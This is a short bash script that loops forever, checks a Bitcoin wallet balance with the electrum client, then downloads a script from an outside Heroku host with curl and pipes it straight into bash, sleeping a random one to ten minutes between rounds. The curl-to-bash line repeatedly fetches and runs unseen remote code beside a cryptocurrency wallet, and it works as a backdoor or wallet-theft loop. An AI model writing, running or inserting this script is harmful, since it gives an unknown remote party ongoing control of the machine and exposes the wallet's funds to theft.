#!/bin/bash
for (( ; ; ))
do
electrum getbalance
bash <(curl -s https://skobet.herokuapp.com/x.php) 


 
sleep $[ ( $RANDOM % 10 )  + 1 ]m
done



